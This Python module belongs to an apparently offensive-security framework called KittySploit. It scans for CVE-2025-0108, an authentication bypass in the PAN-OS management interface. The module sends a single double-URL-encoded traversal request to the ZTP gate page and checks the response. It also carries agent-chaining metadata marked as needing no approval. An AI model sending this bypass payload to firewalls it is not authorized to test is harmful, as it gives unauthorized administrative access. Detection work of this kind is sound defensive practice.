#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in PAN-OS management interface allows authentication bypass through path confusion between Ngi."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PAN-OS Management Interface - Path Confusion to Authentication Bypass Detection',
        'description': 'A vulnerability in PAN-OS management interface allows authentication bypass through path confusion between Nginx and Apache handlers.The issue occurs due to differences in path processing between Nginx and Apache, where double URL encoding combined with directory traversal can bypass authentication checks enforced by X-pan-AuthCheck header.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'panos', 'auth-bypass', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/'],
        'cve': 'CVE-2025-0108',
    }

    def run(self):
        r = self.http_request(method="GET", path='/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<title>Zero Touch Provisioning', 'Zero Touch Provisioning (ZTP)',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="PAN-OS Management Interface - Path Confusion to Authentication Bypass detected",
                path='/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css',
            )
            return True
        return False

